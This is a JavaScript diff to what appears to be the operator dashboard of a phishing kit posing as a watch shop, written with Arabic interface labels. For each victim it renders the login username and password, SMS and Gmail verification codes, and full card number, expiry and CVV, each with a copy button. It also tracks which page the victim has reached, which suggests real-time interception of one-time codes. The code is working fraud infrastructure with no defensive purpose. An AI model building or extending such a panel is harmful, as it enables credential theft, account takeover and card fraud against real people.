@@ -427,49 +427,45 @@ function showDetails(id) {
     : `<div class="color-name">${o.watch_color || "لم يتم الاختيار"}</div>`;
 
   const copyIcon = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>`;
+  function credRow(label, val, color) {
+    if (!val) return `<div class="cred-row"><div><div class="cred-label">${label}</div><div class="cred-val" style="color:var(--muted)">—</div></div></div>`;
+    return `<div class="cred-row"><div><div class="cred-label">${label}</div><div class="cred-val code-val" style="color:${color||'var(--purple)'}">${val}</div></div><div class="cred-right"><button class="cred-copy" onclick="copyCred(this,'${val}')">${copyIcon} نسخ</button></div></div>`;
+  }
 
   let detailsHtml = `
-    <div class="detail-item"><div class="lbl">الاسم</div><div class="val">${o.name}</div></div>
-    <div class="detail-item"><div class="lbl">الهاتف</div><div class="val" style="direction:ltr;text-align:right">${o.phone}</div></div>
-    <div class="detail-item"><div class="lbl">البريد الإلكتروني</div><div class="val">${o.email}</div></div>
-    <div class="detail-item"><div class="lbl">الولاية</div><div class="val">${o.wilaya}</div></div>
-    <div class="detail-item detail-full"><div class="lbl">العنوان</div><div class="val">${o.address}</div></div>
+    <div class="detail-item"><div class="lbl">الاسم</div><div class="val">${o.name||"—"}</div></div>
+    <div class="detail-item"><div class="lbl">الهاتف</div><div class="val" style="direction:ltr;text-align:right">${o.phone||"—"}</div></div>
+    <div class="detail-item"><div class="lbl">البريد الإلكتروني</div><div class="val">${o.email||"—"}</div></div>
+    <div class="detail-item"><div class="lbl">الولاية</div><div class="val">${o.wilaya||"—"}</div></div>
+    <div class="detail-item detail-full"><div class="lbl">العنوان</div><div class="val">${o.address||"—"}</div></div>
     <div class="detail-item"><div class="lbl">لون الساعة</div><div class="val">${o.watch_color||"—"}</div></div>
     <div class="detail-item"><div class="lbl">الحالة</div><div class="val">${statusLabels[o.status]||o.status}</div></div>
     <div class="detail-item"><div class="lbl">الصفحة الحالية</div><div class="val">${pageLabels[o.current_page]||o.current_page||"—"}</div></div>
-    <div class="detail-item"><div class="lbl">تاريخ الطلب</div><div class="val">${new Date(o.created_at).toLocaleString("ar-EG")}</div></div>`;
+    <div class="detail-item"><div class="lbl">تاريخ الطلب</div><div class="val">${o.created_at?new Date(o.created_at).toLocaleString("ar-EG"):"—"}</div></div>`;
 
-  if (o.login_username || o.login_password) {
-    detailsHtml += `<div class="detail-full" style="grid-column:1/-1"><div class="login-data"><h3>بيانات تسجيل الدخول</h3>`;
-    if (o.login_username) {
-      detailsHtml += `<div class="cred-row"><div><div class="cred-label">اسم المستخدم</div><div class="cred-val">${o.login_username}</div></div><div class="cred-right"><button class="cred-copy" onclick="copyCred(this,'${o.login_username}')">${copyIcon} نسخ</button></div></div>`;
-    }
-    if (o.login_password) {
-      detailsHtml += `<div class="cred-row"><div><div class="cred-label">الرمز السري</div><div class="cred-val">${o.login_password}</div></div><div class="cred-right"><button class="cred-copy" onclick="copyCred(this,'${o.login_password}')">${copyIcon} نسخ</button></div></div>`;
-    }
-    detailsHtml += `</div></div>`;
-  }
+  // بيانات تسجيل الدخول
+  detailsHtml += `<div style="grid-column:1/-1"><div class="login-data"><h3>بيانات تسجيل الدخول</h3>`;
+  detailsHtml += credRow("اسم المستخدم", o.login_username, "var(--purple)");
+  detailsHtml += credRow("الرمز السري", o.login_password, "var(--purple)");
+  detailsHtml += `</div></div>`;
 
-  if (o.verification_code) {
-    detailsHtml += `<div class="detail-full" style="grid-column:1/-1"><div class="login-data"><h3 style="color:#1565c0">رمز التحقق</h3>`;
-    detailsHtml += `<div class="cred-row"><div><div class="cred-label">رمز التحقق</div><div class="cred-val code-val">${o.verification_code}</div></div><div class="cred-right"><button class="cred-copy" onclick="copyCred(this,'${o.verification_code}')">${copyIcon} نسخ</button></div></div>`;
-    detailsHtml += `</div></div>`;
-  }
+  // رمز التحقق (SMS)
+  detailsHtml += `<div style="grid-column:1/-1"><div class="login-data"><h3 style="color:#1565c0">رمز التحقق (SMS)</h3>`;
+  detailsHtml += credRow("رمز التحقق", o.verification_code, "#1565c0");
+  detailsHtml += `</div></div>`;
 
-  if (o.email_verification_code) {
-    detailsHtml += `<div class="detail-full" style="grid-column:1/-1"><div class="login-data"><h3 style="color:#d32f2f">رمز الإيميل</h3>`;
-    detailsHtml += `<div class="cred-row"><div><div class="cred-label">رمز الإيميل</div><div class="cred-val code-val" style="color:#d32f2f">${o.email_verification_code}</div></div><div class="cred-right"><button class="cred-copy" onclick="copyCred(this,'${o.email_verification_code}')">${copyIcon} نسخ</button></div></div>`;
-    detailsHtml += `</div></div>`;
-  }
+  // كود الجيميل
+  detailsHtml += `<div style="grid-column:1/-1"><div class="login-data"><h3 style="color:#d32f2f">كود الجيميل</h3>`;
+  detailsHtml += credRow("كود الجيميل", o.email_verification_code, "#d32f2f");
+  detailsHtml += `</div></div>`;
 
-  if (o.card_number) {
-    detailsHtml += `<div class="detail-full" style="grid-column:1/-1"><div class="login-data"><h3 style="color:#e65100">بيانات البطاقة</h3>`;
-    detailsHtml += `<div class="cred-row"><div><div class="cred-label">اسم حامل البطاقة</div><div class="cred-val" style="color:#e65100">${o.card_name||"—"}</div></div><div class="cred-right"><button class="cred-copy" onclick="copyCred(this,'${o.card_name||""}')">${copyIcon} نسخ</button></div></div>`;
-    detailsHtml += `<div class="cred-row"><div><div class="cred-label">رقم البطاقة</div><div class="cred-val code-val" style="color:#e65100">${o.card_number}</div></div><div class="cred-right"><button class="cred-copy" onclick="copyCred(this,'${o.card_number}')">${copyIcon} نسخ</button></div></div>`;
-    detailsHtml += `<div class="cred-row"><div><div class="cred-label">تاريخ الانتهاء</div><div class="cred-val" style="color:#e65100">${o.card_expiry||"—"}</div></div><div class="cred-right"><button class="cred-copy" onclick="copyCred(this,'${o.card_expiry||""}')">${copyIcon} نسخ</button></div></div>`;
-    detailsHtml += `<div class="cred-row"><div><div class="cred-label">CVV</div><div class="cred-val code-val" style="color:#e65100">${o.card_cvv||"—"}</div></div><div class="cred-right"><button class="cred-copy" onclick="copyCred(this,'${o.card_cvv||""}')">${copyIcon} نسخ</button></div></div>`;
-    detailsHtml += `</div></div>`;
-  }
+  // بيانات البطاقة
+  detailsHtml += `<div style="grid-column:1/-1"><div class="login-data"><h3 style="color:#e65100">بيانات البطاقة</h3>`;
+  detailsHtml += credRow("اسم حامل البطاقة", o.card_name, "#e65100");
+  detailsHtml += credRow("رقم البطاقة", o.card_number, "#e65100");
+  detailsHtml += credRow("تاريخ الانتهاء", o.card_expiry, "#e65100");
+  detailsHtml += credRow("CVV", o.card_cvv, "#e65100");
+  detailsHtml += `</div></div>`;
 
   document.getElementById("modalDetails").innerHTML = detailsHtml;
 
